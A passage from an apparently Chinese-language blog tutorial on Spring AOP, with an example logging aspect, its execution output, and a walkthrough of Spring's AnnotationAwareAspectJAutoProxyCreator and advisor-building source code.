punctuation">(</span><span class="token string">"LogAspect..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token comment">/** * 定义切入点：对要拦截的方法进行定义与限制，如包、类 * * 1、execution(public * *(..)) 任意的公共方法 * 2、execution（* set*（..）） 以set开头的所有的方法 * 3、execution（* com.hyq.practice.aop.LogAspect.*（..））   com.hyq.practice.aop.LogAspect这个类里的所有的方法 * 4、execution（* com.hyq.practice.aop.*.*（..））   com.hyq.practice.aop包下的所有的类的所有的方法 * 5、execution（* com.hyq.practice.aop..*.*（..））   com.hyq.practice.aop包及子包下所有的类的所有的方法 * 6、execution(* com.hyq.practice.aop..*.*(String,?,Long))   com.hyq.practice.aop包及子包下所有的类的有三个参数，第一个参数为String类型，第二个参数为任意类型，第三个参数为Long类型的方法 * 7、execution(@annotation(xxx)) */</span><span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(* com.hyq.practice.aop.HelloService.sayHello(..))"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">cutMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>   <span class="token comment">/**    * 前置通知：在目标方法执行前调用    */</span>   <span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span><span class="token string">"cutMethod()"</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">logStart</span><span class="token punctuation">(</span><span class="token class-name">JoinPoint</span> joinPoint<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> name <span class="token operator">=</span> joinPoint<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"前置通知==>"</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">"....【args: "</span><span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>joinPoint<span class="token punctuation">.</span><span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"】"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">/**    * 后置通知：在目标方法执行后调用，若目标方法出现异常，则不执行    */</span>   <span class="token annotation punctuation">@AfterReturning</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"cutMethod()"</span><span class="token punctuation">,</span>returning <span class="token operator">=</span> <span class="token string">"result"</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">logReturn</span><span class="token punctuation">(</span><span class="token class-name">JoinPoint</span> joinPoint<span class="token punctuation">,</span><span class="token class-name">Object</span> result<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> name <span class="token operator">=</span> joinPoint<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"后置通知(不发生异常执行)()==>"</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">"....【args: "</span><span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>joinPoint<span class="token punctuation">.</span><span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"】【result: "</span><span class="token operator">+</span>result<span class="token operator">+</span><span class="token string">"】"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">/**    * 后置/最终通知：无论目标方法在执行过程中出现一场都会在它之后调用    */</span>   <span class="token annotation punctuation">@After</span><span class="token punctuation">(</span><span class="token string">"cutMethod()"</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">logEnd</span><span class="token punctuation">(</span><span class="token class-name">JoinPoint</span> joinPoint<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> name <span class="token operator">=</span> joinPoint<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"后置通知(必定执行)()==>"</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">"....【args: "</span><span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>joinPoint<span class="token punctuation">.</span><span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"】"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">/**    * 异常通知：目标方法抛出异常时执行    */</span>   <span class="token annotation punctuation">@AfterThrowing</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"cutMethod()"</span><span class="token punctuation">,</span>throwing <span class="token operator">=</span> <span class="token string">"e"</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">logError</span><span class="token punctuation">(</span><span class="token class-name">JoinPoint</span> joinPoint<span class="token punctuation">,</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> name <span class="token operator">=</span> joinPoint<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"异常通知()==>"</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">"....【args: "</span><span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>joinPoint<span class="token punctuation">.</span><span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"】【exception: "</span><span class="token operator">+</span>e<span class="token operator">+</span><span class="token string">"】"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">/**    * 环绕通知：灵活自由的在目标方法中切入代码    */</span>   <span class="token annotation punctuation">@Around</span><span class="token punctuation">(</span><span class="token string">"cutMethod()"</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">around</span><span class="token punctuation">(</span><span class="token class-name">ProceedingJoinPoint</span> joinPoint<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> methodName <span class="token operator">=</span> joinPoint<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"环绕方法执行前通知()==> --》 method name "</span> <span class="token operator">+</span> methodName <span class="token operator">+</span> <span class="token string">" args "</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>joinPoint<span class="token punctuation">.</span><span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      joinPoint<span class="token punctuation">.</span><span class="token function">proceed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"环绕方法执行后通知()==> --》 method name "</span> <span class="token operator">+</span> methodName <span class="token operator">+</span> <span class="token string">" args "</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>joinPoint<span class="token punctuation">.</span><span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>hyq<span class="token punctuation">.</span>practice<span class="token punctuation">.</span>aop</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/5/11 * @description: */</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloService</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token class-name">HelloService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello "</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> name<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>hyq<span class="token punctuation">.</span>practice</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>hyq<span class="token punctuation">.</span>practice<span class="token punctuation">.</span>aop<span class="token punctuation">.</span></span><span class="token class-name">HelloService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">SpringBootTest</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@SpringBootTest</span><span class="token keyword">class</span> <span class="token class-name">PracticeApplicationTests</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token class-name">HelloService</span> helloService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">void</span> <span class="token function">contextLoads</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        helloService<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><strong>执行结果：</strong></p><p>环绕方法执行前通知()&#x3D;&#x3D;&gt; –》 method name sayHello args [123]<br>前置通知&#x3D;&#x3D;&gt;sayHello….【args: [123]】<br>Hello 123<br>后置通知(不发生异常执行)()&#x3D;&#x3D;&gt;sayHello….【args: [123]】【result: 123】<br>后置通知(必定执行)()&#x3D;&#x3D;&gt;sayHello….【args: [123]】<br>环绕方法执行后通知()&#x3D;&#x3D;&gt; –》 method name sayHello args [123]</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>正常：前置&#x3D;&gt;目标方法(环绕通知)&#x3D;&gt;返回通知&#x3D;&gt;后置通知</strong></p><p><strong>异常：前置&#x3D;&gt;目标方法(环绕通知)&#x3D;&gt;异常通知&#x3D;&gt;后置通知</strong></p><h2 id="原理剖析"><a href="#原理剖析" class="headerlink" title="原理剖析"></a>原理剖析</h2><p>1、了解AOP为生命周期条件，断点在bean12步骤里面为容器添加了什么组件，使用debug来剖析</p><p>2、AOP实现是 @EnableAspectJAutoProxy 启用AOP功能</p><h3 id="AOP定义阶段"><a href="#AOP定义阶段" class="headerlink" title="AOP定义阶段"></a>AOP定义阶段</h3><p>给容器中利用AspectJAutoProxyRegistrar（实现了ImportBeanDefinitionRegistrar）</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">AopConfigUtils</span><span class="token punctuation">.</span><span class="token function">registerAspectJAnnotationAutoProxyCreatorIfNecessary</span><span class="token punctuation">(</span>registry<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>这个给容器中导入了 AnnotationAwareAspectJAutoProxyCreator 组件</p><p>AnnotationAwareAspectJAutoProxyCreator 本质上是一个BeanPostProcessor。</p><p>容器刷新第五步 invokeBeanFactoryPostProcessors(beanFactory); 的时候会将AnnotationAwareAspectJAutoProxyCreator注册到容器中去，这里面 ReflectiveAspectJAdvisorFactory (创建增强器的工厂) 和 BeanFactoryAspectJAdvisorsBuilderAdapter（增强器适配器建造者）把这些工具准备好。</p><p>后续在正常创建其他对象的时候干预，判断是切面相关 执行BeanPostProcessor 里面的逻辑来增强</p><p>在创建其他Bean的时候（<strong>第一次</strong>）,回去遍历所有类来构建增强器 aspectJAdvisorsBuilder.buildAspectJAdvisors()</p><h3 id="构建增强器的过程"><a href="#构建增强器的过程" class="headerlink" title="构建增强器的过程"></a>构建增强器的过程</h3><p>ps: 案例中这个时候会创建 LogAspect 相关的生成增强器</p><p>aspectJAdvisorsBuilder.buildAspectJAdvisors()</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Advisor</span><span class="token punctuation">></span></span> <span class="token function">buildAspectJAdvisors</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> aspectNames <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>aspectBeanNames<span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>aspectNames <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         aspectNames <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>aspectBeanNames<span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>aspectNames <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Advisor</span><span class="token punctuation">></span></span> advisors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            aspectNames <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> beanNames <span class="token operator">=</span> <span class="token class-name">BeanFactoryUtils</span><span class="token punctuation">.</span><span class="token function">beanNamesForTypeIncludingAncestors</span><span class="token punctuation">(</span>                  <span class="token keyword">this</span><span class="token punctuation">.</span>beanFactory<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> beanName <span class="token operator">:</span> beanNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEligibleBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">continue</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>               <span class="token comment">// We must be careful not to instantiate beans eagerly as in this case they</span>               <span class="token comment">// would be cached by the Spring container but would not have been weaved.</span>               <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> beanType <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>beanFactory<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>beanType <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">continue</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>advisorFactory<span class="token punctuation">.</span><span class="token function">isAspect</span><span class="token punctuation">(</span>beanType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  aspectNames<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token class-name">AspectMetadata</span> amd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AspectMetadata</span><span class="token punctuation">(</span>beanType<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>amd<span class="token punctuation">.</span><span class="token function">getAjType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPerClause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getKind</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">PerClauseKind</span><span class="token punctuation">.</span><span class="token constant">SINGLETON</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                     <span class="token class-name">MetadataAwareAspectInstanceFactory</span> factory <span class="token operator">=</span>                           <span class="token keyword">new</span> <span class="token class-name">BeanFactoryAspectInstanceFactory</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>beanFactory<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">//得到增强器</span>                     <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Advisor</span><span class="token punctuation">></span></span> classAdvisors <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>advisorFactory<span class="token punctuation">.</span><span class="token function">getAdvisors</span><span class="token punctuation">(</span>factory<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>beanFactory<span class="token punctuation">.</span><span class="token function">isSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>advisorsCache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> classAdvisors<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token punctuation">&#125;</span>                     <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>aspectFactoryCache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token punctuation">&#125;</span>                     advisors<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>classAdvisors<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                     <span class="token comment">// Per target or per this.</span>                     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>beanFactory<span class="token punctuation">.</span><span class="token function">isSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Bean with name '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span>                              <span class="token string">"' is a singleton, but aspect instantiation model is not singleton"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token punctuation">&#125;</span>                     <span class="token class-name">MetadataAwareAspectInstanceFactory</span> factory <span class="token operator">=</span>                           <span class="token keyword">new</span> <span class="token class-name">PrototypeAspectInstanceFactory</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>beanFactory<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token keyword">this</span><span class="token punctuation">.</span>aspectFactoryCache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span>                     advisors<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>advisorFactory<span class="token punctuation">.</span><span class="token function">getAdvisors</span><span class="token punctuation">(</span>factory<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>aspectBeanNames <span class="token operator">=</span> aspectNames<span class="token punctuation">;</span>            <span class="token keyword">return</span> advisors<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>aspectNames<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">emptyList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Advisor</span><span class="token punctuation">></span></span> advisors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> aspectName <span class="token operator">:</span> aspectNames<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Advisor</span><span class="token punctuation">></span></span> cachedAdvisors <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>advisorsCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>aspectName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>cachedAdvisors <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         advisors<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>cachedAdvisors<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">MetadataAwareAspectInstanceFactory</span> factory <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>aspectFactoryCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>aspectName<span class="token punctuation">)</span><span class="token punctuation">;</span>         advisors<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>advisorFactory<span class="token punctuation">.</span><span class="token function">getAdvisors</span><span class="token punctuation">(</span>factory<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> advisors<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>构建好了会放在advisorsCache 缓存中去</p><p>得到增强器 this.advisorFactory.getAdvisors(factory);</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Advisor</span><span class="token punctuation">></span></span> <span class="token function">getAdvisors</span><span class="token punctuation">(</span><span class="token class-name">MetadataAwareAspectInstanceFactory</span> aspectInstanceFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aspectClass <span class="token operator">=</span> 